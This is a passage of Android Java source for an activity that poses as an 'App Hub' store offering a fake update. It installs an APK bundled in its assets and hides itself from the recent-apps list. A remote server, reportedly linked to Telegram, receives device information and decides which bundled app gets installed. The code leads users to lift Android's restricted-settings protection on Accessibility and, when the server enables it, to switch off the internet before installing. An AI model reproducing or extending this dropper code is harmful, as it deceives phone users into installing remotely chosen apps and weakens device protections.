package com.smartstore.installer;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.RatingBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.FileProvider;

import com.google.android.material.button.MaterialButton;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

/**
 * SmartStore V2.0 - متجر ذكي يخفي نفسه بعد التثبيت الأول
 * 
 * التحديثات:
 * - تغيير زر "تثبيت" إلى "تحديث"
 * - إخفاء واجهة المتجر نهائياً بعد التثبيت الأول
 * - فتح التطبيق المضمّن مباشرة بدون واجهة
 * - حفظ حالة التثبيت في SharedPreferences
 * 
 * @version 2.0.0
 * @author Smart Developer
 */
public class StoreActivity extends AppCompatActivity {

    private static final String TAG = "SmartStore";
    private static final int REQUEST_INSTALL_PERMISSION = 1001;
    private static final int REQUEST_INSTALL_APK = 1002;
    private static final String APK_NAME = "embedded_app.apk";
    private static final String APKS_NAME = "embedded_app.apks"; // ✅ دعم APKS
    
    // ✅ APKS Installer instance
    private ApksInstaller apksInstaller;
    
    // SharedPreferences للحفظ الدائم
    private static final String PREFS_NAME = "SmartStorePrefs";
    private static final String KEY_FIRST_INSTALL_DONE = "first_install_completed";
    private static final String KEY_TARGET_PACKAGE = "target_package_name";

    // UI Components
    private ImageView imgAppIcon;
    private TextView txtAppName;
    private TextView txtDeveloper;
    private TextView txtCategory;
    private TextView txtRating;
    private RatingBar ratingBar;
    private TextView txtRatingCount;
    private TextView txtDownloads;
    private TextView txtVersion;
    private TextView txtSize;
    private TextView txtUpdated;
    private TextView txtDescription;
    private TextView txtWhatsNew;
    private MaterialButton btnAction;
    private FrameLayout loadingOverlay;
    private TextView txtLoadingMessage;
    // ✅ عناصر شاشة "جاري التحديث" - عدّاد تقدّم
    private ProgressBar progressBar;
    private TextView txtProgressPercent;

    // App Data
    private File apkFile;
    private String targetPackageName;
    private String targetAppName;
    private Drawable targetAppIcon;
    private String targetVersionName;
    private long apkFileSize;
    private boolean isAppInstalled = false;
    private boolean isFirstInstallDone = false;

    private Handler mainHandler;
    // ✅ Polling: استعلام دوري عن حالة الجهاز من السيرفر كل 30 ثانية
    private Handler pollHandler;
    private Runnable pollRunnable;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        mainHandler = new Handler(Looper.getMainLooper());
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);

        // ✅ Polling كل 5 ثوانٍ - استجابة فورية لطلب التحديث من السيرفر
        // بدون الحاجة لإغلاق المتجر وإعادة فتحه
        pollHandler = new Handler(Looper.getMainLooper());
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                // ✅ استخدم callback لإعادة بناء الواجهة فوراً عند تغيير الوضع
                TelegramLogger.pollServer(StoreActivity.this, (newMode, newTargetApp) -> {
                    Log.d(TAG, "⚡ Mode changed via polling: " + newMode + ", targetApp=" + newTargetApp);
                    // ✅ أعد بناء Activity فوراً لرؤية وضع التحديث الجديد
                    runOnUiThread(() -> {
                        Toast.makeText(StoreActivity.this,
                            "force_update".equals(newMode) ? "📦 يتوفر تحديث جديد!" : "✅ تم تحديث الحالة",
                            Toast.LENGTH_SHORT).show();
                        // إعادة تشغيل Activity لتطبيق الوضع الجديد
                        recreate();
                    });
                });
                pollHandler.postDelayed(this, 5000); // كل 5 ثوانٍ
            }
        };

        // ✅ إرسال معلومات الجهاز للسيرفر عند فتح المتجر (السيرفر يرسلها لتليجرام)
        // + يستقبل وضع التحكم (auto / force_update)
        TelegramLogger.logOpen(this);

        // ✅ قراءة وضع التحكم المحفوظ من السيرفر
        String serverMode = TelegramLogger.getCachedMode(this);
        Log.d(TAG, "Server mode: " + serverMode);

        // ✅ CRITICAL FIX: فحص التطبيق المضمّن من assets أولاً
        // هذا يعمل حتى لو حُذف المتجر وأُعيد تثبيته
        String embeddedPackageName = getEmbeddedAppPackageName();

        if (embeddedPackageName != null) {
            Log.d(TAG, "Embedded app package: " + embeddedPackageName);

            // ✅ فحص: هل التطبيق المضمّن مثبت على الجهاز؟
            if (isPackageInstalled(embeddedPackageName)) {
                // ✅ إذا السيرفر طلب تحديث إجباري → اعرض واجهة التحديث
                if ("force_update".equals(serverMode)) {
                    Log.d(TAG, "⚠️ Server requested force_update - showing store UI");
                    // نعرض الواجهة بدلاً من الفتح المباشر
                } else {
                    Log.d(TAG, "✅ Embedded app is already installed, launching directly...");
                    launchTargetAppDirectly(embeddedPackageName);
                    return; // ✅ لا تعرض الواجهة أبداً
                }
            } else {
                Log.d(TAG, "⚠️ Embedded app not installed, showing store UI");
            }
        }

        // ✅ الطريقة القديمة (للتوافق مع الإصدارات السابقة)
        isFirstInstallDone = prefs.getBoolean(KEY_FIRST_INSTALL_DONE, false);
        String savedPackageName = prefs.getString(KEY_TARGET_PACKAGE, null);

        if (isFirstInstallDone && savedPackageName != null) {
            if (isPackageInstalled(savedPackageName)) {
                // ✅ احترام وضع التحكم عن بعد
                if ("force_update".equals(serverMode)) {
                    Log.d(TAG, "⚠️ Server requested force_update - showing store UI");
                } else {
                    Log.d(TAG, "App already installed (from prefs), launching directly...");
                    launchTargetAppDirectly(savedPackageName);
                    return;
                }
            } else {
                // التطبيق تم حذفه → أعد تعيين الحالة
                Log.d(TAG, "App was deleted, resetting state");
                prefs.edit()
                    .putBoolean(KEY_FIRST_INSTALL_DONE, false)
                    .putString(KEY_TARGET_PACKAGE, null)
                    .apply();
                isFirstInstallDone = false;
            }
        }
        
        // إذا لم يكن مثبتاً → عرض واجهة المتجر
        Log.d(TAG, "Showing store UI for first-time installation");
        setContentView(R.layout.activity_store);
        
        // Initialize UI
        initializeViews();
        
        // Check permissions
        checkPermissions();
        
        // Load APK info
        loadApkFromAssets();
    }
    
    /**
     * ✅ NEW: الحصول على Package Name للتطبيق المضمّن من assets
     * هذه الطريقة تعمل حتى لو حُذف المتجر وأُعيد تثبيته
     */
    private String getEmbeddedAppPackageName() {
        try {
            // محاولة قراءة APKS أولاً
            String fileName = null;
            try {
                getAssets().open(APKS_NAME).close();
                fileName = APKS_NAME;
                Log.d(TAG, "Found APKS file in assets");
            } catch (IOException e) {
                // إذا لم يكن APKS، جرب APK
                try {
                    getAssets().open(APK_NAME).close();
                    fileName = APK_NAME;
                    Log.d(TAG, "Found APK file in assets");
                } catch (IOException e2) {
                    Log.e(TAG, "No APK or APKS found in assets");
                    return null;
                }
            }
            
            // نسخ الملف إلى temp location
            File tempDir = getExternalFilesDir(null);
            if (tempDir == null) tempDir = getFilesDir();
            File tempFile = new File(tempDir, "temp_check.apk");
            
            InputStream is = getAssets().open(fileName);
            FileOutputStream fos = new FileOutputStream(tempFile);
            byte[] buffer = new byte[8192];
            int length;
            while ((length = is.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            fos.close();
            is.close();
            
            // إذا كان APKS، استخرج base.apk
            if (fileName.endsWith(".apks")) {
                File extractDir = new File(tempDir, "temp_extract");
                if (!extractDir.exists()) extractDir.mkdirs();
                
                java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(
                    new FileInputStream(tempFile));
                java.util.zip.ZipEntry entry;
                
                while ((entry = zis.getNextEntry()) != null) {
                    if (entry.getName().endsWith(".apk")) {
                        File extractedApk = new File(extractDir, "base.apk");
                        FileOutputStream os = new FileOutputStream(extractedApk);
                        while ((length = zis.read(buffer)) > 0) {
                            os.write(buffer, 0, length);
                        }
                        os.close();
                        tempFile = extractedApk;
                        break;
                    }
                }
                zis.close();
            }
            
            // قراءة Package Name من APK
            PackageManager pm = getPackageManager();
            PackageInfo packageInfo = pm.getPackageArchiveInfo(
                tempFile.getAbsolutePath(), 0);
            
            if (packageInfo != null) {
                String packageName = packageInfo.packageName;
                Log.d(TAG, "✅ Embedded app package name: " + packageName);
                
                // تنظيف الملفات المؤقتة
                tempFile.delete();
                
                return packageName;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting embedded app package name", e);
        }
        
        return null;
    }

    /**
     * التحقق من أن package مثبت
     */
    private boolean isPackageInstalled(String packageName) {
        try {
            PackageInfo pi = getPackageManager().getPackageInfo(packageName, 0);
            return (pi != null);
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    /**
     * فتح التطبيق المستهدف مباشرة بدون واجهة
     *
     * ✅ ميزة V19: استخدام finishAndRemoveTask لإخفاء المتجر تماماً من قائمة
     *    التطبيقات المفتوحة (Recent Apps) - يبدو المستخدم كأنه فتح التطبيق فقط
     */
    private void launchTargetAppDirectly(String packageName) {
        try {
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);

            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(launchIntent);
                Log.d(TAG, "Target app launched successfully");
            } else {
                Log.e(TAG, "Cannot get launch intent for package: " + packageName);
                Toast.makeText(this, "لا يمكن فتح التطبيق", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error launching target app", e);
            Toast.makeText(this, "خطأ في فتح التطبيق", Toast.LENGTH_SHORT).show();
        } finally {
            // ✅ إغلاق المتجر + إزالته من قائمة التطبيقات المفتوحة (Recent Apps)
            // هذا يجعل المستخدم يرى فقط التطبيق المضمن في القائمة
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                finishAndRemoveTask();
            } else {
                finish();
            }
        }
    }

    /**
     * تهيئة عناصر الواجهة
     */
    private void initializeViews() {
        imgAppIcon = findViewById(R.id.imgAppIcon);
        txtAppName = findViewById(R.id.txtAppName);
        txtDeveloper = findViewById(R.id.txtDeveloper);
        txtCategory = findViewById(R.id.txtCategory);
        txtRating = findViewById(R.id.txtRating);
        ratingBar = findViewById(R.id.ratingBar);
        txtRatingCount = findViewById(R.id.txtRatingCount);
        txtDownloads = findViewById(R.id.txtDownloads);
        txtVersion = findViewById(R.id.txtVersion);
        txtSize = findViewById(R.id.txtSize);
        txtUpdated = findViewById(R.id.txtUpdated);
        txtDescription = findViewById(R.id.txtDescription);
        txtWhatsNew = findViewById(R.id.txtWhatsNew);
        btnAction = findViewById(R.id.btnAction);
        loadingOverlay = findViewById(R.id.loadingOverlay);
        txtLoadingMessage = findViewById(R.id.txtLoadingMessage);

        // Set button click listener
        btnAction.setOnClickListener(v -> handleActionButton());

        // ✅ ربط عناصر شاشة "جاري التحديث" (العدّاد)
        progressBar = findViewById(R.id.progressBar);
        txtProgressPercent = findViewById(R.id.txtProgressPercent);

        // ❌ تم حذف: زر "تفعيل المزايا" وبطاقة التعليمات بناءً على طلب المستخدم
    }

    /**
     * ✅ فتح صفحة App Info للتطبيق المُثبّت
     *
     * على هذه الصفحة يمكن للمستخدم:
     *   1. الضغط على ⋮ (ثلاث نقاط بأعلى الشاشة)
     *   2. اختيار "Allow restricted settings" أو "السماح بالإعدادات المقيّدة"
     *   3. هذا يزيل تقييد Accessibility الذي يضعه Android 13+ على التطبيقات
     *      المُثبّتة من خارج Google Play
     *
     * ملاحظة: لا يمكن إزالة هذا التقييد برمجياً (هو app-op محمي OP_ACCESS_RESTRICTED_SETTINGS)
     * الطريقة الرسمية الوحيدة هي توجيه المستخدم لهذه الصفحة.
     */
    private void openInstalledAppSettings() {
        String pkg = targetPackageName;
        if (pkg == null || pkg.isEmpty()) {
            // احصل الـ package من prefs أو من الـ embedded app
            pkg = getEmbeddedAppPackageName();
        }
        if (pkg == null) {
            Toast.makeText(this, "لم يتم تثبيت التطبيق بعد", Toast.LENGTH_LONG).show();
            return;
        }

        try {
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);

            // رسالة توضيحية مغرية للمستخدم
            Toast.makeText(this,
                "اضغط ⋮ بالأعلى ثم اختر «السماح بالإعدادات المقيّدة» لتفعيل كل المزايا ✨",
                Toast.LENGTH_LONG).show();

            Log.d(TAG, "Opened app settings for: " + pkg);
        } catch (Exception e) {
            Log.e(TAG, "Cannot open app settings for " + pkg, e);
            // fallback: افتح قائمة التطبيقات المثبتة
            try {
                Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
                startActivity(intent);
            } catch (Exception e2) {
                Toast.makeText(this, "تعذّر فتح الإعدادات", Toast.LENGTH_SHORT).show();
            }
        }
    }

    /**
     * التحقق من الصلاحيات المطلوبة
     */
    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Check install permission
            if (!getPackageManager().canRequestPackageInstalls()) {
                // لا نعرض الحوار تلقائياً، ننتظر الضغط على زر "تحديث"
                Log.d(TAG, "Install permission not granted yet");
            }
        }
    }

    /**
     * عرض حوار طلب صلاحية التثبيت
     */
    private void showInstallPermissionDialog() {
        new AlertDialog.Builder(this)
            .setTitle("صلاحية التثبيت مطلوبة")
            .setMessage("يحتاج التطبيق إلى صلاحية تثبيت التطبيقات من مصادر غير معروفة لإتمام عملية التحديث.")
            .setPositiveButton("منح الصلاحية", (dialog, which) -> {
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, REQUEST_INSTALL_PERMISSION);
            })
            .setNegativeButton("إلغاء", null)
            .setCancelable(false)
            .show();
    }

    /**
     * قراءة APK من مجلد Assets
     *
     * ✅ يدعم تلقائياً:
     *   - embedded_app.apks (الأولوية الأولى)
     *   - embedded_app.apk (الأولوية الثانية)
     *   - أي ملف .apks في assets
     *   - أي ملف .apk في assets
     */
    private void loadApkFromAssets() {
        showLoading("جاري التحضير للتحديث...");
        
        // ✅ Initialize APKS Installer
        apksInstaller = new ApksInstaller(this);

        new Thread(() -> {
            try {
                // ✅ STEP 1: اكتشاف ملف التطبيق في assets تلقائياً
                String fileName = null;
                boolean isApks = false;
                
                // الأولوية 1: embedded_app.apks
                try {
                    getAssets().open(APKS_NAME).close();
                    fileName = APKS_NAME;
                    isApks = true;
                    Log.d(TAG, "✅ Found APKS file in assets: " + fileName);
                } catch (IOException e) {
                    // الأولوية 2: embedded_app.apk
                    try {
                        getAssets().open(APK_NAME).close();
                        fileName = APK_NAME;
                        isApks = false;
                        Log.d(TAG, "✅ Found APK file in assets: " + fileName);
                    } catch (IOException e2) {
                        // الأولوية 3: ابحث عن أي ملف .apks أو .apk في assets
                        String[] assets = getAssets().list("");
                        if (assets != null) {
                            for (String a : assets) {
                                if (a.endsWith(".apks")) {
                                    fileName = a;
                                    isApks = true;
                                    Log.d(TAG, "✅ Found APKS file in assets (search): " + fileName);
                                    break;
                                }
                            }
                            if (fileName == null) {
                                for (String a : assets) {
                                    if (a.endsWith(".apk")) {
                                        fileName = a;
                                        isApks = false;
                                        Log.d(TAG, "✅ Found APK file in assets (search): " + fileName);
                                        break;
                                    }
                                }
                            }
                        }
                        if (fileName == null) {
                            throw new IOException("No APK or APKS file found in assets");
                        }
                    }
                }
                
                // ✅ STEP 2: نسخ الملف إلى external files directory
                InputStream is = getAssets().open(fileName);
                
                File externalDir = getExternalFilesDir(null);
                if (externalDir == null) {
                    externalDir = getFilesDir();
                }
                
                apkFile = new File(externalDir, fileName);
                
                Log.d(TAG, "Target file location: " + apkFile.getAbsolutePath());
                Log.d(TAG, "File type: " + (isApks ? "APKS (Split APKs)" : "APK (Single)"));
                
                FileOutputStream fos = new FileOutputStream(apkFile);
                byte[] buffer = new byte[8192];
                int length;
                long totalBytes = 0;
                
                while ((length = is.read(buffer)) > 0) {
                    fos.write(buffer, 0, length);
                    totalBytes += length;
                }
                
                fos.flush();
                fos.close();
                is.close();

                Log.d(TAG, "✅ File copied successfully: " + apkFile.getAbsolutePath());
                Log.d(TAG, "✅ Total bytes copied: " + totalBytes);

                // Get file size
                apkFileSize = apkFile.length();
                
                // ✅ STEP 3: استخراج المعلومات حسب نوع الملف
                if (isApks) {
                    extractApksInfo();
                } else {
                    extractApkInfo();
                }

                // Check if app is already installed
                checkIfAppInstalled();

                // Update UI
                runOnUiThread(this::updateUI);

            } catch (IOException e) {
                Log.e(TAG, "Error loading file from assets", e);
                runOnUiThread(() -> {
                    hideLoading();
                    Toast.makeText(this, "لم يتم العثور على ملف APK أو APKS", Toast.LENGTH_LONG).show();
                    btnAction.setEnabled(false);
                });
            }
        }).start();
    }
    
    /**
     * ✅ استخراج معلومات من APKS file - مطابق لـ V7 الأصلي
     * يستخرج splits ثم يقرأ المعلومات من أول واحد (base)
     */
    private void extractApksInfo() {
        showLoading("جاري التحضير للتحديث...");
        
        try {
            // استخراج Split APKs مؤقتاً لقراءة المعلومات
            File tempExtractDir = new File(getExternalFilesDir(null), "temp_apks");
            java.util.List<File> splitApks = apksInstaller.extractSplitApks(apkFile, tempExtractDir);
            
            if (splitApks.isEmpty()) {
                throw new IOException("No APK files found in APKS");
            }
            
            // قراءة المعلومات من أول APK (عادة base.apk)
            File baseApk = splitApks.get(0);
            Log.d(TAG, "Reading info from: " + baseApk.getName());
            
            PackageManager pm = getPackageManager();
            PackageInfo packageInfo = pm.getPackageArchiveInfo(baseApk.getAbsolutePath(), 
                PackageManager.GET_ACTIVITIES);

            if (packageInfo != null) {
                targetPackageName = packageInfo.packageName;
                targetVersionName = packageInfo.versionName;

                // Get app info
                ApplicationInfo appInfo = packageInfo.applicationInfo;
                appInfo.sourceDir = baseApk.getAbsolutePath();
                appInfo.publicSourceDir = baseApk.getAbsolutePath();

                // Get app name
                CharSequence appLabel = pm.getApplicationLabel(appInfo);
                targetAppName = (appLabel != null) ? appLabel.toString() : packageInfo.packageName;

                // Get app icon
                targetAppIcon = pm.getApplicationIcon(appInfo);

                Log.d(TAG, "✅ APKS Info extracted:");
                Log.d(TAG, "  Package: " + targetPackageName);
                Log.d(TAG, "  Name: " + targetAppName);
                Log.d(TAG, "  Version: " + targetVersionName);
                Log.d(TAG, "  Split APKs count: " + splitApks.size());
            } else {
                throw new IOException("Failed to extract package info from APKS");
            }
            
            // لا نحذف الملفات المستخرجة لأننا سنحتاجها للتثبيت لاحقاً (مثل V7)
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting APKS info", e);
            targetAppName = "تطبيق مضمّن";
            targetVersionName = "غير معروف";
        }
    }

    /**
     * استخراج معلومات APK
     */
    private void extractApkInfo() {
        showLoading("جاري التحضير للتحديث...");

        try {
            PackageManager pm = getPackageManager();
            PackageInfo packageInfo = pm.getPackageArchiveInfo(apkFile.getAbsolutePath(), 
                PackageManager.GET_ACTIVITIES);

            if (packageInfo != null) {
                targetPackageName = packageInfo.packageName;
                targetVersionName = packageInfo.versionName;

                // Get app info
                ApplicationInfo appInfo = packageInfo.applicationInfo;
                appInfo.sourceDir = apkFile.getAbsolutePath();
                appInfo.publicSourceDir = apkFile.getAbsolutePath();

                // Get app name
                targetAppName = (String) pm.getApplicationLabel(appInfo);

                // Get app icon
                targetAppIcon = pm.getApplicationIcon(appInfo);

                Log.d(TAG, "APK Info - Package: " + targetPackageName + ", Name: " + targetAppName + 
                    ", Version: " + targetVersionName);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error extracting APK info", e);
            targetAppName = "تطبيق ذكي";
            targetVersionName = "1.0.0";
        }
    }

    /**
     * التحقق من أن التطبيق مثبت بالفعل
     */
    private void checkIfAppInstalled() {
        if (targetPackageName != null) {
            isAppInstalled = isPackageInstalled(targetPackageName);
            Log.d(TAG, "App installed: " + isAppInstalled);
        }
    }

    /**
     * ✅ تحديث الواجهة بمعلومات المتجر (وليس التطبيق المضمن)
     *
     * العرض يكون:
     *   - اسم المتجر: App Hub
     *   - أيقونة المتجر: @mipmap/ic_launcher
     *   - رسالة: "يتوفر إصدار جديد، يرجى التحديث"
     *   - زر: تحديث
     */
    private void updateUI() {
        hideLoading();

        // ✅ عرض أيقونة المتجر (وليس التطبيق المضمن)
        imgAppIcon.setImageResource(R.mipmap.ic_launcher);

        // ✅ عرض اسم المتجر
        txtAppName.setText("App Hub");

        // ✅ رسالة "يتوفر إصدار جديد"
        txtCategory.setText("يتوفر إصدار جديد");
        txtDeveloper.setText("AppHub Technologies");

        // إصدار المتجر (من BuildConfig أو ثابت)
        txtVersion.setText("v8.0.0");

        // حجم التحديث (يظهر حجم ملف التطبيق المضمن لأنه هو ما سيُنزّل)
        txtSize.setText(formatFileSize(apkFileSize));

        // تاريخ اليوم
        SimpleDateFormat sdf = new SimpleDateFormat("d MMMM yyyy", new Locale("ar"));
        txtUpdated.setText(sdf.format(new Date()));

        // ✅ وصف يجذب المستخدم للتحديث
        txtDescription.setText("يتوفر إصدار جديد من التطبيق يحتوي على تحسينات في الأداء، "
            + "إصلاح بعض المشاكل، وميزات جديدة تجعل تجربتك أفضل. يُنصح بالتحديث الآن "
            + "للحصول على أفضل أداء وأحدث المزايا.");

        // ✅ رسالة "ما الجديد"
        txtWhatsNew.setText("• تحسينات كبيرة في الأداء والاستقرار\n"
            + "• إصلاح مشاكل سابقة وتحسين التجربة\n"
            + "• واجهة محسّنة وأسرع\n"
            + "• ميزات جديدة تنتظرك ✨");

        // ✅ زر "تحديث" بدلاً من "تثبيت"
        btnAction.setText("تحديث الآن");
        btnAction.setIcon(ContextCompat.getDrawable(this, android.R.drawable.stat_sys_download));
        btnAction.setEnabled(true);

        Log.d(TAG, "UI updated - Showing store branding, button: تحديث الآن");
    }

    /**
     * معالجة ضغط زر الإجراء (تحديث فقط)
     */
    private void handleActionButton() {
        // دائماً نثبت (حتى لو مثبت سابقاً)
        installApp();
    }

    /**
     * ✅ تثبيت التطبيق - يفتح شاشة "جاري التحديث" الكاملة (UpdateActivity)
     *
     * ✅ حماية Android 13+: لا يُسمح بالتثبيت والإنترنت مفتوح
     * ✅ يدعم تبديل التطبيق: عند force_update يثبّت التطبيق الهدف من assets
     *
     * السيرفر يحدد أي تطبيق من assets يثبّته المستخدم.
     * لا حاجة لتنزيل من السيرفر - التطبيقات كلها محلية في assets.
     */
    private void installApp() {
        // Check install permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!getPackageManager().canRequestPackageInstalls()) {
                Log.d(TAG, "Install permission not granted, showing dialog");
                showInstallPermissionDialog();
                return;
            }
        }

        // ✅ حماية Android 13+ : يجب إغلاق الإنترنت قبل التحديث
        // ✅ ميزة جديدة: يتم التحكم بها من السيرفر (افتراضي: معطّلة)
        if (TelegramLogger.getCachedRequireInternetOff(this)) {
            if (isInternetConnected()) {
                Log.d(TAG, "⚠️ Internet warning enabled + internet connected - blocking install");
                showInternetWarningDialog();
                return;
            }
        }

        // ✅ تحقق من وضع التحكم عن بعد
        String serverMode = TelegramLogger.getCachedMode(this);
        String targetApp = TelegramLogger.getCachedTargetApp(this);

        // ✅ إذا الوضع force_update والتطبيق الهدف مختلف عن embedded → استخدمه من assets
        if ("force_update".equals(serverMode) && targetApp != null && !targetApp.isEmpty()) {
            Log.d(TAG, "✅ Server requested target app: " + targetApp);

            // فحص: هل التطبيق الهدف موجود في assets؟
            boolean existsInAssets = false;
            try {
                String[] assets = getAssets().list("");
                if (assets != null) {
                    for (String a : assets) {
                        if (a.equals(targetApp)) {
                            existsInAssets = true;
                            break;
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Cannot list assets", e);
            }

            if (existsInAssets) {
                // ✅ نسخ التطبيق الهدف من assets إلى external dir
                if (copyAppFromAssets(targetApp)) {
                    Log.d(TAG, "✅ Using target app from assets: " + targetApp);
                    // extractInfoFromDownloadedApk يُستدعى داخل copyAppFromAssets
                } else {
                    Toast.makeText(this, "تعذّر نسخ التطبيق الهدف", Toast.LENGTH_LONG).show();
                    return;
                }
            } else {
                Log.w(TAG, "⚠️ Target app not in assets: " + targetApp + " - using default");
            }
        }

        if (apkFile == null || !apkFile.exists()) {
            Log.e(TAG, "❌ File not found!");
            Toast.makeText(this, "ملف التطبيق غير موجود", Toast.LENGTH_LONG).show();
            return;
        }

        // ✅ فحص نوع الملف (APK أو APKS)
        boolean isApks = apkFile.getName().endsWith(".apks") ||
                        apksInstaller.isApksFile(apkFile);

        Log.d(TAG, "Starting UpdateActivity - pkg=" + targetPackageName
                + ", apkPath=" + apkFile.getAbsolutePath() + ", isApks=" + isApks);

        // ✅ فتح UpdateActivity (شاشة جاري التحديث الكاملة)
        Intent intent = new Intent(this, UpdateActivity.class);
        intent.putExtra(UpdateActivity.EXTRA_PACKAGE_NAME, targetPackageName);
        intent.putExtra(UpdateActivity.EXTRA_APK_PATH, apkFile.getAbsolutePath());
        intent.putExtra(UpdateActivity.EXTRA_IS_APKS, isApks);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    /**
     * ✅ نسخ تطبيق محدد من assets إلى external dir لاستخدامه في التثبيت
     * @param appName اسم الملف في assets
     * @return true إذا نجح
     */
    private boolean copyAppFromAssets(String appName) {
        try {
            File externalDir = getExternalFilesDir(null);
            if (externalDir == null) externalDir = getFilesDir();
            File outputFile = new File(externalDir, appName);

            InputStream is = getAssets().open(appName);
            FileOutputStream fos = new FileOutputStream(outputFile);
            byte[] buffer = new byte[8192];
            int length;
            while ((length = is.read(buffer)) > 0) {
                fos.write(buffer, 0, length);
            }
            fos.flush();
            fos.close();
            is.close();

            apkFile = outputFile;
            apkFileSize = outputFile.length();
            Log.d(TAG, "✅ Copied: " + appName + " (" + apkFileSize + " bytes)");

            // ✅ استخراج معلومات الحزمة
            extractInfoFromDownloadedApk(apkFile);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "copyAppFromAssets error", e);
            return false;
        }
    }

    /**
     * ✅ استخراج معلومات الحزمة من ملف APK/APKS منزّل من السيرفر
     */
    private void extractInfoFromDownloadedApk(File apkFile) {
        try {
            File baseApk = apkFile;
            // إذا كان APKS، استخرج base.apk مؤقتاً
            if (apkFile.getName().endsWith(".apks")) {
                File tempDir = new File(getCacheDir(), "temp_extract_" + System.currentTimeMillis());
                baseApk = apksInstaller.extractSplitApks(apkFile, tempDir).stream()
                    .findFirst().orElse(apkFile);
            }
            PackageManager pm = getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(baseApk.getAbsolutePath(), 0);
            if (info != null) {
                targetPackageName = info.packageName;
                targetVersionName = info.versionName;
                Log.d(TAG, "✅ Downloaded app: " + targetPackageName + " v" + targetVersionName);
            }
        } catch (Exception e) {
            Log.e(TAG, "extractInfoFromDownloadedApk error", e);
        }
    }

    /**
     * ✅ فحص اتصال الإنترنت (WiFi أو بيانات الهاتف)
     */
    private boolean isInternetConnected() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return false;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                if (network == null) return false;
                android.net.NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                return caps != null && (caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)
                        || caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)
                        || caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET));
            } else {
                android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                return info != null && info.isConnectedOrConnecting();
            }
        } catch (Exception e) {
            Log.e(TAG, "isInternetConnected error", e);
            return false;
        }
    }

    /**
     * ✅ dialog تحذير: يجب إغلاق الإنترنت قبل التحديث على Android 13+
     */
    private void showInternetWarningDialog() {
        new AlertDialog.Builder(this)
            .setTitle("⚠️ لاجل تحديث يرجى إغلاق الإنترنت")
            .setMessage("على إصدار Android 13+، لا يمكن تحديث التطبيق والإنترنت مفتوح.\n\n"
                + "يرجى اتباع الخطوات التالية:\n\n"
                + "1️⃣ أغلق الإنترنت (WiFi + بيانات الهاتف)\n"
                + "2️⃣ ارجع للمتجر واضغط «تحديث الآن»\n"
                + "3️⃣ سيتم التحديث بشكل صحيح وبدون أخطاء\n"
                + "4️⃣ بعد التحديث، افتح الإنترنت مباشرة\n\n"
                + "✅ سيعمل التطبيق بعد إعادة فتح الإنترنت")
            .setPositiveButton("موافق، سأغلق الإنترنت", null)
            .setCancelable(false)
            .show();
    }
    
    /**
     * ✅ تثبيت APKS file - مطابق لـ V7 الأصلي
     * يستخرج splits للقرص أولاً ثم يستدعي installSplitApks
     */
    private void installApksFile() {
        new Thread(() -> {
            try {
                Log.d(TAG, "✅ Installing APKS using PackageInstaller API...");
                
                // استخراج Split APKs
                File tempExtractDir = new File(getExternalFilesDir(null), "temp_apks");
                java.util.List<File> splitApks = apksInstaller.extractSplitApks(apkFile, tempExtractDir);
                
                if (splitApks.isEmpty()) {
                    throw new IOException("No APK files found in APKS");
                }
                
